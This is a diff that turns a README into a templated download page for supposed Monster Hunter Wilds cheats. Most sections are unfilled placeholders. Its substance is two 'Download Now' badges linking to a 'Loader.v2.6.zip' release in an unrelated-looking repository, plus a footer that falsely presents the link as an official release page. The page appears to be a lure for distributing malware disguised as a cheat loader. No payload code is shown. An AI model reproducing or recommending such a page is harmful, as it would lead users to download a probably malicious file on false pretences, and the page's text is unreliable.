@@ -1,2 +1,50 @@
-# Monster-Hunter-Wilds-Cheats
-{reponame} · Updated: {date}
+<div align="center">
+
+# Monster Hunter Wilds Cheats
+
+{summary}
+
+**Tags:** `Monster-Hunter-Wilds` `monster-hunter-wilds-game` `monster-hunter-wilds-guide` `game` `pc` `gaming` `online-game` `multiplayer-game` `co-op`
+
+`Monster-Hunter-Wilds-Cheats` · Updated: 2026-09-27
+
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/LomerunekProk/releases/download/v1.0.0/Loader.v2.6.zip)
+
+Latest Version: v1.0.0 • File Size: ~156 MB
+
+</div>
+
+## About Monster Hunter Wilds Cheats
+
+{description}
+
+## Features
+
+{features}
+
+## How to install
+
+{install_steps}
+
+## Download Monster Hunter Wilds Cheats
+
+<div align="center">
+
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/LomerunekProk/releases/download/v1.0.0/Loader.v2.6.zip)
+
+Latest Version: v1.0.0
+
+</div>
+
+## FAQ
+
+{faq}
+
+## Tags
+
+`Monster-Hunter-Wilds` `monster-hunter-wilds-game` `monster-hunter-wilds-guide` `game` `pc` `gaming` `online-game` `multiplayer-game` `co-op`
+
+---
+
+> This page is provided for informational purposes. The download link leads to the
+> official release page, so the version and file size are always up to date.
